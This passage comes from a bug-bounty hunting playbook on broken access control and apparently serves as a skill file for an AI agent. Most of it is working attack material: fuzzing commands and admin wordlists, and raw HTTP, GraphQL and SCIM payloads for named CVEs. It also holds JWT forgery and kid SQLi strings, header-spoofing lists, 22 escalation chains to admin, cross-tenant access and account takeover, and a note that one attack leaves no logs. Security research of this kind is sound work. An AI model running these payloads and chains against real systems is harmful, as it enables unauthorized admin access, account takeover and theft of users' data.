### Webhook cross-tenant (CVE-2025-59273 Azure Event Grid)
- Webhook secret in target tenant's config
- Onboard victim tenant, find pre-existing subscription
- Retrieve secret, compromise webhook endpoint
- All config done in home tenant — no telemetry in target tenant

### Org-invitation acceptance flaw
1. Sign up Org B
2. Send invitation from Org B to attacker email
3. URL `/invite/accept/{token}` doesn't verify token belongs to your session-org
4. Use token issued for Org A invite (intercepted, leaked, or harvested)
5. Now in Org A with whatever role the original invite specified

### Capsule Kubernetes pattern (CVE-2025-55205)
- Namespace label injection from authenticated tenant user
- Tenant user injects labels into system namespaces
- Undermines tenant isolation, hijack system namespaces

### Real cases
- **Shopify Partners** (H1 #300305 — $15,250)
- **TikTok cross-tenant** (H1 #984965): GraphQL `AddRulesToPixelEvents`
- **Stripe** (H1 #1066203): cross-tenant on Connect via GraphQL
- **PayPal businessmanage** (H1 #415081 — $10,500): `POST /businessmanage/users/api/v1/users` with arbitrary `business_account_id`

---

## 13. Email Confirmation / SSO Bypass (Shopify's Top-Paying Class)

The pattern that paid $15,250 at Shopify and $3,000 at GitLab:

1. Sign up with `attacker@target-company.com` (an email at the victim org's domain)
2. Trigger email confirmation; intercept the link/token
3. Manipulate the confirmation flow:
   - Skip the verify step (POST directly to next step)
   - Replay an OLD confirmation token
   - Modify the confirmed-email field (`?email=attacker@victim.com&confirmed=true`)
   - Mass-assign `email_verified: true` in registration body
4. App auto-binds session to "verified" company-email user → SSO mapping kicks in
5. Now logged in as a member of victim's company → admin if SSO maps domains to roles

Target every: `/auth/verify`, `/email/confirm`, `/oauth/grant`, `/sso/callback`, `/partner/accept-invite`, `/scim/setup`, `/saml/acs`.

---

## 14. Force-Browsing Admin Endpoints

### Use SecLists + custom wordlists
```bash
# Top wordlists
/usr/share/seclists/Discovery/Web-Content/api/objects.txt
/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
/usr/share/seclists/Discovery/Web-Content/AdminPanels.txt
/usr/share/seclists/Discovery/Web-Content/Common-PHP-Filenames.txt

# Run ffuf
ffuf -u https://target.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt \
  -H "Cookie: SESS=LOW_PRIV" \
  -mc 200,201,301,302,401  \
  -fc 404,403   \
  -fs 0

# kiterunner (smart API endpoint fuzzing)
kr scan https://target.com -w routes-large.kite -H "Authorization: Bearer LOW_TOKEN"

# Custom admin wordlist
cat > admin-paths.txt << EOF
admin
admin-api
api/admin
api/v1/admin
api/v2/admin
api/_internal
api/internal
api/staff
api/manage
api/sudo
api/superuser
admin/users
admin/dashboard
admin/settings
admin/audit
admin/billing
admin/feature-flags
admin/impersonate
console
control
controlpanel
manage
manager
staff
staff-portal
backend
backoffice
intranet
godmode
.well-known/admin
.well-known/console
scim/v2/Users
scim/v2/Groups
graphql
api/graphql
EOF
ffuf -u https://t.com/FUZZ -w admin-paths.txt -mc 200,302
```

### Mine from sourcemap + JS bundle
```bash
# Sourcemap mining
curl -s https://app.target.com/static/main.js.map | jq '.sources[]' | sort -u | grep -E 'admin|staff|internal'

# Find React lazy admin imports
grep -RoE 'lazy\([^)]+admin' dist/

# Find Vue/Angular admin routes
grep -RoE '"path":\s*"/(admin|staff)' dist/

# katana deep crawl
katana -u https://target.com -d 5 -jc -kf all -ef png,jpg,svg | grep -E 'admin|api/'

# Wayback Machine + gau + waymore
waymore -i target.com -mode U -oU urls.txt
gau target.com >> urls.txt
sort -u urls.txt | grep -E 'admin|internal|staff' > sensitive.txt
```

---

## 15. SCIM Provisioning Attacks (NEW 2026 — Critical Class)

### Attack surface
- `/scim/v2/Users` — create/update users
- `/scim/v2/Groups` — group membership
- `/scim/v2/ServiceProviderConfig` — discovery
- `/scim/v2/Schemas` — schema
- `/scim/v2/ResourceTypes` — types

### CVE-2025-41115 (Grafana Enterprise CVSS 10.0)
```http
POST /scim/v2/Users HTTP/1.1
Authorization: Bearer <scim_token>
Content-Type: application/scim+json

{
  "schemas": ["urn:ietf:params:scim:schemas:core:2.0:User"],
  "userName": "attacker",
  "externalId": "1",                    ← maps to internal uid=1 (admin)
  "active": true,
  "emails": [{"value":"attacker@x.com","primary":true}]
}
```

### General SCIM abuse vectors
1. **Token leak** — SCIM tokens commonly leak from CI/CD secrets, JS bundles, partner integration repos
2. **Cross-tenant** — token scoped to tenant A, endpoint accepts tenant_id of B in URL/body
3. **MFA bypass** — `POST /scim/v2/Groups` adds victim to admin group without MFA challenge
4. **Self-provision admin** — SCIM rarely validates `roles` field server-side

### Recon for SCIM
```bash
curl https://target.com/scim/v2/ServiceProviderConfig
curl https://target.com/scim/v2/Schemas | jq
ffuf -u https://target.com/FUZZ -w scim-paths.txt -mc 200,401
```

---

## 16. GraphQL BAC (Updated for 2026)

### Step 1 — Introspect (or use Clairvoyance if disabled)
```graphql
{__schema{types{name,fields{name,type{name}}}}}
{__schema{mutationType{fields{name,args{name,type{name}}}}}}
```
Look for: `createAdminUser`, `deleteUser`, `banUser`, `grantAdmin`, `setRole`, `impersonateAs`, `enableFeature`, `setTenantOwner`.

### Step 2 — Field-level authz probe
GraphQL servers often check at TYPE level but not FIELD level:
```graphql
{user(id: VICTIM_ID) {
  id
  email
  passwordResetToken    ← restricted field returned anyway
  sessionTokens
  apiKeys
}}
```

### Step 3 — Mutation-level BFLA (HackerOne $12,500 pattern)
Call admin mutation with low-priv token:
```graphql
mutation {
  CreateOrUpdateHackerCertification(
    userId: "VICTIM_USER_ID"
    delete: true
  ) {success}
}
```
Server checks mutation exists but not whether caller has permission to set arbitrary `userId`.

### Step 4 — Relay Node Interface Bypass
The `node(id: GLOBAL_ID)` query bypasses field-level checks:
```graphql
{node(id: "VXNlcjoxMjM=") {   ← base64 of "User:123"
  ... on User { email, role, apiKey }
}}
```

### Step 5 — Apollo Federation Interface-Directive Bypass (NEW 2025-2026)
Apollo Federation < 2.9.5/2.10.4/2.11.5/2.12.1 fail to propagate `@authenticated`, `@requiresScopes`, `@policy` from interfaces to implementing concrete types. Bypass with inline/named fragments:
```graphql
{someQuery {
  ... on ConcreteImplementer {   ← skips interface-level directive
    protectedField
    sensitiveData
  }
}}
```

### Step 6 — Batching / Aliasing for rate-limit bypass + brute force
```graphql
{
  q1: user(id:1){email}
  q2: user(id:2){email}
  q3: user(id:3){email}
  ... (1000+ aliased queries in one request)
}
```
- Bypass rate limits (limited per request, not per operation)
- Bypass 2FA (send all OTP variants in one batch)

### Step 7 — Cross-tenant via shared IDs
GraphQL global IDs (Relay) are opaque base64 but tenancy boundaries often missing:
```graphql
{node(id: "T3JnUHJvamVjdDoxMjM0NQ==") { ... }}
# Base64 of "OrgProject:12345" — load any tenant's project
```

### Step 8 — WebSocket GraphQL (subscriptions) IDOR
```javascript
// graphql-ws / subscriptions-transport-ws
ws.send(JSON.stringify({
  type: "subscribe",
  payload: {
    query: "subscription { otherUserNotifications(userId: VICTIM) { msg } }"
  }
}))
```
SQLi-chain example (Apr 2026 case): IDOR in WebSocket → escalated to PostgreSQL error-based injection → PII leak.

### Recon
```bash
# Endpoint discovery
ffuf -u https://target.com/FUZZ -w graphql-paths.txt
# /graphql, /api/graphql, /gql, /v1/graphql, /federation, /apollo

# Apollo Federation specific
curl https://target.com/.well-known/apollo/server-health
```

---

## 17. Header Trust Class (NEW 2025-2026)

Modern framework attack class: server trusts headers that are supposed to be "internal" but receives them from public traffic.

### Next.js CVE-2025-29927 (CVSS 9.1)
```http
GET /admin/dashboard HTTP/1.1
Host: app.target.com
x-middleware-subrequest: middleware
```
Middleware skipped entirely. Affects all self-hosted Next.js with `output: standalone`. To verify recursion depth:
```
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

### CrushFTP CVE-2025-2825 (CVSS 9.8)
```http
GET /admin/ HTTP/1.1
X-Forwarded-For: 127.0.0.1
```
Server treats request as local → bypasses auth.

### Generic internal-header trust list to test
```
x-middleware-subrequest: middleware
x-rsc: 1
x-internal-route: true
x-internal: true
x-trust-proxy: true
x-vercel-internal: true
x-vercel-skip-toolbar: 1
x-deployment-id: any
x-prerender-revalidate: 1
x-original-url: /admin
x-rewrite-url: /admin
x-forwarded-prefix: /admin
x-forwarded-uri: /admin
x-forwarded-for: 127.0.0.1
x-real-ip: 127.0.0.1
x-cluster-client-ip: 127.0.0.1
x-azure-clientip: 127.0.0.1
x-aws-cloudfront-internal: true
cf-connecting-ip: 127.0.0.1
true-client-ip: 127.0.0.1
```

---

## 18. Burp / Autorize / PwnFox Workflow

### Autorize (canonical BAC tool)
1. Burp → BApp Store → Install Autorize
2. Configure: paste LOW-PRIV cookie/Bearer; set enforcement-detector rules
3. Toggle ON
4. Browse the app as HIGH-PRIV user
5. Every request auto-replayed with low-priv creds; flagged green/red/yellow
6. Reds = potential BAC; manually verify in Repeater

### Auth Analyzer (multi-session)
- Add the app to scope
- Create N sessions (one per role + unauth)
- Each request through proxy gets replayed in every session
- Single dashboard shows responses side-by-side

### PwnFox (multi-identity Firefox)
- Firefox Multi-Account Containers (per-tab color)
- 8 distinct identities with independent cookie jars
- Burp shows color-coded request origins
- Ideal for cross-tenant tests with 3+ accounts

### Authz (alternative)
- Per-request manual replay with role-switching helper

### Manual workflow
1. Send privileged request to Repeater
2. Duplicate tab (Ctrl+R)
3. Replace token with lower-priv
4. Send; compare; document differential

### Avoiding false positives
- Triage every flag — shared resources will appear as same response across roles
- Look for distinct DATA, not just status code (200 with redacted body ≠ vuln)
- Re-auth after mass-assignment test to verify privilege persisted

---

## 19. Real Bug Bounty Case Studies (Expanded 2024-2026)

### Case A — Shopify Email Confirmation Bypass → Shop Owner ATO (H1 #791775, #796808, #910300)
- Pattern: Bypass myshopify email-confirm → SSO auto-binds session to victim shop owner
- Impact: Mass merchant takeover
- Class: SSO bridging + email-verify bypass

### Case B — Shopify Partner Invite (H1 #300305, $15,250)
- Given any employee email, accept partner invite as admin to victim store
- Class: Cross-tenant org takeover

### Case C — Shopify Partner Invite v2 (H1 #2885269, $3,500)
- Partner invitation acceptable without email verification

### Case D — LocalTapiola Oracle Webcenter (H1 #170532, $18,000)
- `/cs/Satellite` admin via path bypass
- Class: Forced-browsing + path-normalization

### Case E — TikTok intelbot (H1 #1328546, $15,000)
- Internal service exposed
- Class: Internal service exposed

### Case F — HackerOne Cert deletion (H1 #2122671, $12,500)
- GraphQL mutation `CreateOrUpdateHackerCertification` accepts any user's cert ID
- Class: GraphQL BFLA / IDOR composite

### Case G — PayPal businessmanage (H1 #415081, $10,500)
- `POST /businessmanage/users/api/v1/users` with arbitrary `business_account_id`
- Class: API endpoint accepting other-tenant identifier

### Case H — GitHub private repo (H1 #3124517, $10,000)
- Arbitrary read of another user's private repo
- Class: Object-level authz failure

### Case I — Superhuman SSO disable (H1, $10,500)
- Ability to disable any organization's SSO opens ATO opportunity
- Class: Org-level BAC

### Case J — Uber tax-docs (H1 #530441, $4,500)
- Forced-browsing exposed tax-doc subdomain
- Class: Forced-browsing + missing auth

### Case K — GitLab OAuth email-verify bypass (H1 #922456, $3,000)
- OAuth grant flow accepts unverified email → 3rd-party app trusts → ATO

### Case L — GitLab impersonation replay (H1 #493324)
- Admin impersonation token reusable by impersonated user → admin context

### Case M — LY Corp admin LINE account (H1 #698579)
- Become admin for any LINE Official Account

### Case N — LY Corp request smuggling (H1 #740037)
- Smuggled request to admin-official.line.me → admin session
- Class: Smuggling + BAC composite

### Case O — Razer Pay (H1 #757095, $1,000)
- Delete other users' bank accounts via BAC

### Case P — Ubiquiti (H1 #544928)
- User → SYSTEM via unauthenticated cmd-exec
- Class: Pre-auth + privesc

### Case Q — Upserve (H1 #322985)
- Reset password for any account

### Case R — HackerOne team-permission (H1 #605720)
- Team member with Program permission modified role → became Admin
- Class: Mass-assignment + BFLA

### Case S — Semmle workers privesc (H1 #692603, $1,500)
- Privilege escalation in workers container

### Case T — Shopify Partners admin auth bypass (H1 #270981)
- partners.shopify.com admin authentication bypass

### Case U — Stripe GraphQL cross-tenant (H1 #1066203)
- `UpdateAtlasApplicationPerson` admin adds co-founder to Atlas application of merchant
- Class: GraphQL cross-tenant via shared admin context

### Case V — McHire McDonald's (June 2025 — disclosure)
- 64 million job applications exposed
- Bug 1: admin login accepts `123456:123456`
- Bug 2: `/api/lead/cem-xhr?lead_id=N` sequential IDOR
- Class: Default credentials + classic IDOR

### Case W — Mozilla Firefox Accounts (H1 #3154983, 2025)
- IDOR allowing authenticated SSO attacker to delete user's account using email address

### Case X — Autodesk User Profile (H1 #2962056, 2025)
- IDOR in user profile photo edit via `id` parameter

### Case Y — SingleStore (H1 #3219944, 2025)
- IDOR in `GetNotebookScheduledPaginatedJobs` via `projectID` parameter

### Case Z — Yelp Business Platform (Appsecure 2025)
- Low-priv user removes business owners via GraphQL operation BAC

---

## 20. 2025-2026 Critical CVE Inventory

| CVE | CVSS | Target | Class | PoC pattern |
|-----|------|--------|-------|-------------|
| CVE-2025-29927 | 9.1 | Next.js middleware | Header trust | `x-middleware-subrequest: middleware` |
| CVE-2025-55241 | 10.0 | Entra ID Actor Tokens | Cross-tenant | Replay actor token across tenants |
| CVE-2025-41115 | 10.0 | Grafana SCIM | externalId privesc | `externalId:"1"` in SCIM POST |
| CVE-2025-12420 | 9.3 | ServiceNow AI Platform | BodySnatcher | email-only account linking |
| CVE-2025-3089 | High | ServiceNow AI | BAC | Various |
| CVE-2025-3648 | High | ServiceNow | Misconfigured ACLs | Data exfil |
| CVE-2025-24813 | 9.8 | Apache Tomcat | Path semicolon RCE | `/app/..;/uploads/shell.jsp` |
| CVE-2025-55752 | High | Apache Tomcat | Relative path traversal | RewriteValve regression |
| CVE-2025-2825 | 9.8 | CrushFTP | XFF bypass | `X-Forwarded-For: 127.0.0.1` |
| CVE-2025-41232 | Med | Spring Security | Method-annotation on private | Private method authz skipped |
| CVE-2025-41248 | Med | Spring Security | Generic-type annotation | `@PreAuthorize` ignored |
| CVE-2025-41249 | Med | Spring Framework | Annotation detect | Generic hierarchy bypass |
| CVE-2025-41253 | Med | Spring Cloud Gateway | Actuator SpEL | Env var disclosure |
| CVE-2025-41254 | Med | Spring WebSocket | STOMP CSRF | Pre-init message |
| CVE-2025-14778 | High | Keycloak UMA | Horizontal privesc | UMA multi-resource check |
| CVE-2025-13881 | High | Keycloak Admin API | Unmanaged attributes | `/unmanagedAttributes` |
| CVE-2025-14083 | High | Keycloak Admin REST | Schema exposure | Backend schema leak |
| CVE-2025-14559 | High | Keycloak | Token-exchange disabled user | Disabled account gets token |
| CVE-2025-14777 | High | Keycloak Admin API | IDOR cross-client | resourceServer mismatch |
| CVE-2025-13526 | 7.5 | OneClick Chat to Order WP | Unauth IDOR | `order_id` increment |
| CVE-2025-13932 | 8.3 | SolisCloud | Auth'd IDOR | `plant_id` modification |
| CVE-2025-3013 | High | NightWolf Pentest Portal | IDOR | Manipulated parameters |
| CVE-2025-59273 | High | Azure Event Grid | Webhook cross-tenant | Pre-existing subscription |
| CVE-2025-55205 | 9.1 | Capsule K8s | Cross-tenant namespace | Label injection |
| CVE-2025-30066 | Crit | tj-actions/changed-files | Compromised action | CI/CD privesc |

---

## 21. Chain Templates (BAC → Critical)

### Chain 1 — Mass-Assignment → Admin → Full ATO
```
1. PATCH /api/users/me  body:{"display_name":"x","role":"admin"}
2. Server applies role=admin silently
3. GET /api/admin/users → 200 (now admin)
4. POST /api/admin/users/{victim}/reset-password
5. Set victim password → ATO any user
→ Critical
```

### Chain 2 — JWT alg=none → admin → Cross-tenant
```
1. Decode JWT, change role to "admin", set alg=none
2. Replay → server accepts
3. List all tenants via /api/admin/tenants
4. Read each tenant's billing + PII
→ Critical
```

### Chain 3 — Email-Confirm Bypass → Partner Invite → Org Owner (Shopify $15,250)
```
1. Sign up using victim@company.com
2. POST /api/email/confirm without prior code → server marks verified
3. Accept pending partner invite as Admin role
4. → Owner of victim's store
```

### Chain 4 — Next.js Middleware Header Bypass → Admin Panel (CVE-2025-29927)
```
1. GET /admin → 403
2. GET /admin -H "x-middleware-subrequest: middleware" → 200
3. Full admin dashboard accessible
4. Mass-assignment on /admin/users → create new admin
→ Critical pre-auth
```

### Chain 5 — Method-Tampering → Privesc
```
1. GET /api/admin/users/{n} → 403
2. POST /api/admin/users/{n}/promote → 200 (handler not protected on POST)
3. Self-promote → admin
→ Critical
```

### Chain 6 — API Version Drift → Pre-Auth Admin
```
1. /api/v2/admin/* requires admin JWT
2. /api/v1/admin/* deployed without middleware
3. Unauthenticated curl returns admin data
→ Critical pre-auth
```

### Chain 7 — Impersonation Replay (GitLab #493324)
```
1. Trigger admin to view-as your account (support ticket)
2. Capture session cookie/token during impersonation
3. Replay token after impersonation ends → admin context persists
→ Critical
```

### Chain 8 — SCIM externalId Privesc (CVE-2025-41115 Grafana pattern)
```
1. Acquire SCIM token (leaked in repo / partner config / JS bundle)
2. POST /scim/v2/Users body:{userName:"x", externalId:"1", active:true, ...}
3. Server maps externalId="1" to internal uid=1 (admin)
4. Auth as new "x" user → operates as admin
→ Critical
```

### Chain 9 — Force-Browse + Mass-Assignment
```
1. ffuf finds /api/_internal/users (200 with low-priv token, leaked from JS bundle)
2. POST /api/_internal/users body:{role:"admin", email:"attacker"}
3. Admin user created
→ Critical
```

### Chain 10 — OAuth Scope-Upgrade → Cross-User Admin
```
1. Acquire low-scope OAuth token (user:read)
2. Token-exchange (RFC 8693) requesting scope=admin:all
3. Server doesn't re-verify against consent → admin token issued
4. Read every user's data
→ Critical
```

### Chain 11 — JSON-Route Variant Privacy Bypass (HackerOne #2487889)
```
1. GET /bugs/12345 → 403 (login required)
2. GET /bugs/12345.json → 200 with full report data
→ High mass private-report disclosure
```

### Chain 12 — SCIM Group Bypass (Okta-style)
```
1. POST /scim/v2/Groups body:{members:[{value:"VICTIM_USER_ID","type":"admin"}]}
2. Adds victim to admin group with no MFA challenge
3. Use SCIM token from external IdP → bypass MFA on victim
→ Critical
```

### Chain 13 — Customer-Success Tool Abuse
```
1. Find /staff/lookup?email=X endpoint (often leaks in JS bundle for support page)
2. Test with low-priv user → 200 returns full PII
3. Mass enum → bulk PII dump
→ Critical
```

### Chain 14 — Feature-Flag Manipulation
```
1. Discover feature-flag endpoint /api/featureflags
2. PATCH /api/featureflags body:{"enable_admin":true,"premium":true,"bypass_auth":true}
3. Server applies → admin UI enabled
→ Critical
```

### Chain 15 — GraphQL BFLA on Mutation (HackerOne $12,500)
```
1. Introspect mutations
2. Find mutation like deleteUser(id:), banUser(id:), grantAdmin(userId:)
3. Call with low-priv token
4. Server doesn't check role at mutation level
→ Critical
```

### Chain 16 — Apollo Federation Interface-Directive Bypass
```
1. Schema has interface Protected @authenticated { sensitiveField: String }
2. Concrete type implements Protected but inherits NO directive
3. Query: { someField { ... on ConcreteImplementer { sensitiveField } } }
4. Bypasses entire authz layer
→ Critical
```

### Chain 17 — Entra ID Actor Token Replay (CVE-2025-55241)
```
1. Attacker has any Entra ID tenant (free)
2. Request Actor token in own tenant
3. Replay against Azure AD Graph API of victim tenant
4. Tenant claim not validated → Global Admin in victim tenant
5. No MFA, no Conditional Access, no logs
→ Critical
```

### Chain 18 — ServiceNow BodySnatcher (CVE-2025-12420)
```
1. Find Virtual Agent / Now Assist AI integration
2. Use hardcoded universal client secret
3. Account-link with victim email
4. AI agent executes with victim's privileges (incl. admin)
5. Create backdoor admin
→ Critical
```

### Chain 19 — WebSocket Subprotocol Authz Bypass
```
1. Open WS connection as low-priv
2. Subscribe to other-user's channel via WS message
3. Server validates auth on connect but NOT on subscribe
4. Receive cross-user data
→ High/Critical
```

### Chain 20 — Agentic AI Shared-Context Authz
```
1. AI agent with read-access to confidential data
2. Agent shared in channel/workspace with mixed-perm users
3. Trigger agent to summarize/respond → outputs confidential data to all viewers
4. Cross-user data leak via agent
→ High
```

### Chain 21 — Mass-Assignment + IDOR Composite (Silent ATO)
```
1. PATCH /api/users/{victim_id} body:{"email":"attacker@x.com"}  ← IDOR + change email
2. POST /password-reset email=attacker@x.com  ← receive reset token
3. POST /password-reset/confirm token=X new=attacker_password
4. Login as victim
→ Critical
```

### Chain 22 — UUID v1 Prediction
```
1. Create attacker account → capture attacker UUID (v1 has timestamp)
2. Compute timestamp range for victim creation
3. Enumerate UUIDs in that range
4. Match against valid user list → cross-user access
→ Medium (with mass enum potential = High)
```

---

## 22. Severity Map

| Finding | Severity |
|---------|----------|
| Read own data (no privesc) | Info |
| Access self-admin features (intended) | Info |
| Force-browse admin endpoint returning 401/403 | Info |
| Force-browse admin endpoint returning 200 empty | Low |
| Vertical privesc to mod-tier on single feature | Medium |
| Vertical privesc to mod-tier with PII view | High |
| Cross-user read via BAC | High |
| Cross-user write (silent state change) | High |
| Cross-user account deletion | High |
| Privilege escalation to admin (any scope) | **Critical** |
| Mass-assignment role promotion | **Critical** |
| JWT forge → admin context | **Critical** |
| Cross-tenant in multi-tenant SaaS | **Critical** |
| Email-confirm/SSO bypass → shop owner ATO | **Critical** (max) |
| Pre-auth admin access via version drift or middleware bypass | **Critical** (max) |
| Force-browse → RCE chain | **Critical** (max) |
| Customer-success/staff tool mass-PII | **Critical** (max) |
| SCIM externalId privesc (Grafana pattern) | **Critical** (max) |
| Cross-tenant actor token replay (Entra ID pattern) | **Critical** (max) |
| AI agent cross-user data exposure | High → Critical |

---

## 23. Validation Gate (BAC-Specific)

### Gate 1 — Action specificity
"With low-priv Account L, the request `<EXACT REQUEST>` executes against admin endpoint and returns `<EXACT DATA / EFFECT>`. Account L has no legitimate admin permission."

### Gate 2 — Privilege jump quantified
- "L user gained access to <list of admin functions>: read/write all user data, modify roles, view audit logs."
- "Cross-tenant: Org B user accessed Org A's <data class> including <PII fields>."

### Gate 3 — Reproduction
- Two accounts (and two orgs for cross-tenant) created during PoC
- Exact request shown
- 200/302/success response showing privileged action executed
- No reliance on pre-existing state
- **Reproduced 3 times** (CLAUDE-RULES/16)

### Anti-patterns
- 200 with empty payload — no action
- 302 redirect to login — not actually logged in as admin
- Admin endpoint behind login you don't have — get one first
- "Could enable" / "potentially" — show the execution
- Reading admin docs page that's intentionally public — not a finding
- 200 with redacted fields — read more carefully
- Customer-support tool access only for support-role accounts — intended
- "JWT decoder shows admin role" — but signature still validates — not exploited
- Mass-assignment that flips an unused field — show real impact

---

## 24. Reporting Template (Triage-Optimized)

```
Title: [Severity] Privilege escalation in <area> via <technique> — <admin/cross-tenant impact>

Summary:
A low-privileged user can <achieve admin/cross-tenant access> by <single sentence: mass-assignment / JWT alg=none / 403 bypass / SCIM externalId injection / etc.>. <Quantify scale: affects N users, mass-enumerable, $X impact>.

Reproduction:
1. Sign up Account L (low-priv).
2. <Setup steps: Sign up Org A, Org B for cross-tenant>.
3. As Account L: send request:
   <COMPLETE HTTP REQUEST or curl one-liner>
4. Server responds with 200 OK and the action executes:
   <PASTE response snippet showing privileged action — DB write, admin record returned, role escalated>
5. Verification: GET /api/admin/* now returns 200 with admin payload.

Impact:
- Privilege escalation: <low-priv role> → <admin role>
- Affected scope: <all users / all tenants / specific feature>
- Data at risk: <PII fields / billing / source code / auth secrets>
- Financial: <if applicable>
- ATO chain: <yes/no, describe>

CVSS 3.1: AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H = ~9.0 Critical
```

Note: Per CLAUDE-RULES/18, do NOT include patch suggestion code. Describe the issue, not the fix.

---

## 25. Bypass Techniques Catalog (Quick Reference)

### JWT bypasses
- `alg: none` (or `None`, `NONE`, `nOnE`)
- RS256 → HS256 confusion (sign with public key as HMAC secret)
- `kid` path traversal: `../../../../dev/null`
- `kid` SQLi: `' UNION SELECT 'secret' --`
- `jku` / `x5u` injection (attacker-controlled key URL)
- Embedded `jwk` (some libs trust)
- Empty signature with HMAC algorithms
- Expired token still accepted (no `exp` check)
- `sub` claim modification to victim ID
- ES256 r=s=0 (CVE-2022-21449 family)
- Mutable `email_verified` / `app_metadata` claim
- Refresh token reuse post-rotation
- Token issuance for disabled user (CVE-2025-14559)

### IDOR-adjacent bypasses
- ID in array: `{"id":[123]}` instead of `{"id":123}`
- ID nested: `{"id":{"value":123}}`
- Type confusion: send `"123"` instead of `123`
- Wildcard: `{"id":"*"}` `{"id":null}` `{"id":""}`
- Multiple keys: `{"id":"mine","id":"victim"}`
- Format trick: `.json`, `.xml`, `.css`, `.html` route variant
- UUID v1 timestamp prediction

### Role-claim bypasses
- Remove role entirely → server defaults to "admin"
- Empty string role: `""`
- Array role: `["user","admin"]`
- Unicode lookalike: `Аdmin` (Cyrillic А)
- Case variant: `Admin`, `ADMIN`, `aDmIn`
- Trailing space: `"admin "`
- Bool variants: `true`, `1`, `"yes"`, `"on"`
- Spring Security: include `ROLE_` prefix (`ROLE_ADMIN`)

### Method tampering
- Try GET/POST/PUT/PATCH/DELETE/HEAD/OPTIONS/TRACE/PROPFIND
- `X-HTTP-Method-Override: DELETE`
- `?_method=PUT` query param
- Some frameworks: form-encoded body `_method=PUT`

### Header bypasses
- Next.js: `x-middleware-subrequest: middleware`
- Generic: `X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-Path`
- IP-trust: `X-Forwarded-For: 127.0.0.1` (12 variants)
- Host injection: `Host: admin.target.com`, `X-Host:`

---

## 26. Anti-Patterns (auto-rejected 2026)

- "403 on /admin endpoint" — that's the system working
- "/admin returns 404 with low-priv user" — not BAC
- Admin behind a separate login you don't have — get a real BAC
- "Could escalate" / "potentially admin" — show the dump
- Single 200 response with empty body — confirm action actually executed
- Reading documentation that's intentionally public — not a finding
- 200 with redacted fields — read more carefully
- Customer-support tool access only for support-role accounts — intended
- "JWT decoder shows admin role" — but signature still validates — not exploited
- Mass-assignment that flips an unused field — show real impact
- "Direct access to /scim/v2/ServiceProviderConfig returns 200" — that's the discovery endpoint, intended
- ACAO:* with no creds and no sensitive data — not a finding
- "GraphQL introspection enabled" alone — explain the resulting vuln you found via introspection

---

## 27. Cross-References

- `hunt-idor` — Object-level / horizontal access (BOLA half of BAC)
- `hunt-jwt` — Deep JWT attack reference (alg confusion, kid SQLi, jku/x5u, embedded jwk, ES256 r=s=0)
- `hunt-graphql` — GraphQL BFLA on mutations + introspection + Apollo Federation
- `hunt-auth-bypass` — Pre-auth chains, missing middleware (Next.js CVE-2025-29927)
- `hunt-ato` — Email change → password reset chain
- `hunt-api-misconfig` — Mass assignment, zombie endpoints, hidden parameters
- `hunt-business-logic` — Workflow bypass + multi-step privesc chains
- `hunt-oauth` — Scope-upgrade (RFC 8693), state CSRF, redirect_uri bypass, RFC 9700 BCP
- `hunt-saml` — Signature wrapping (XSW1-XSW8), comment injection
- `hunt-403-bypass` — Dedicated 403 bypass tree
- `hunt-websocket` — WebSocket subprotocol IDOR, per-message authz
- `hunt-llm-ai` / `hunt-llm-advanced` — Agentic AI shared-context authz, AI feature IDOR
- `hunt-metadata-ssrf` — SSRF (now part of BAC per OWASP 2025)
- `security-arsenal` — Payload tables and bypass references
- `triage-validation` — 7-Q gate
- `critical-attack-matrix` — Per-primitive attack chains

---

## 28. Golden Heuristics (2026 Edition)

- **"Vertical + cross-tenant + mass-assignment composites are the highest-paying class in 2026."**
- **"Mass-assignment + IDOR composite = silent ATO."**
- "Always try email-confirm bypass on partner/SSO flows. Shopify pays $15k for this."
- "JWT alg=none still works on ~10% of real targets in 2026."
- "API v0/v1 legacy routes are the easiest pre-auth wins."
- "GraphQL mutations are the new vertical-privesc target."
- "The `.json` route variant trick wins more BAC bugs than any payload."
- "Customer-success / staff tools are pre-prod-quality production code — always over-privileged."
- "If admin is hidden in JS bundle, force-browse the route. If it returns 200 — done."
- "Method tampering: GET 403 → POST 200 is the single most common bypass."
- "Autorize while you browse, PwnFox to switch identity, Burp to manually confirm."
- "Don't trust UUIDs. Don't trust 'opaque' refs. Don't trust client-side role gates. Don't trust 'authenticated-only' as 'secure.'"
- "Two accounts. Two orgs. Every endpoint. Every method. Every header. Every body field."
- "If it touches money or roles — try every variant before moving on."
- **"Internal-routing headers are the new attack class. Next.js's `x-middleware-subrequest` was the canonical 2025 example."**
- **"SCIM endpoints are universally weaker than user-facing auth. Always probe `/scim/v2/` for both presence and externalId mapping."**
- **"OAuth token-exchange (RFC 8693) trusts the caller's scope claim. Try requesting higher than originally consented."**
- **"Apollo Federation interface directives don't propagate. Inline fragments on concrete types bypass entire authz layer."**
- **"Email-only account linking + hardcoded universal secret = ServiceNow BodySnatcher class. Probe AI integrations for this."**
- **"In 2025-2026, Actor/Service-to-Service tokens are a new attack surface. They bypass MFA, Conditional Access, and logs."**
- **"AI agents inherit the caller's permissions but output to channels with mixed permissions. That asymmetry is a BAC primitive."**
- **"WebSocket: auth-on-connect ≠ authz-on-each-message. Test per-message authz separately."**
- **"Tomcat's semicolon (`..;/`) is path-traversal, not a typo. Tomcat's CVE-2025-24813 made this RCE."**
- **"Spring Security 6.4.x/6.5.x: method-security annotations silently dropped on parameterized generic types. CVE-2025-41248."**

---

## 29. Hunt Checklist (Print This)

```
[ ] Account L (low-priv, Org A) created
[ ] Account A (admin, Org A) created
[ ] Account B (low-priv, Org B) created — for cross-tenant
[ ] Unauthenticated session ready
[ ] All endpoints enumerated (JS bundle + sourcemap + Wayback + ffuf + katana)
[ ] All roles' object IDs captured

PER-ENDPOINT TESTING:
[ ] L replays A's requests — vertical privesc
[ ] B replays A's requests + swaps tenant ID — cross-tenant
[ ] Unauth replays A's requests — pre-auth
[ ] Method tampering on every gated route (GET/POST/PUT/PATCH/DELETE/HEAD/OPTIONS)
[ ] API version downgrade (/v2/ → /v1/ → /v0/ → /_internal/)
[ ] 403 bypass tree (path normalization + header injection)
[ ] Mass-assignment scan on every PATCH/PUT/POST
[ ] JWT decode + tamper (alg=none, RS256→HS256, kid/jku, embedded jwk)
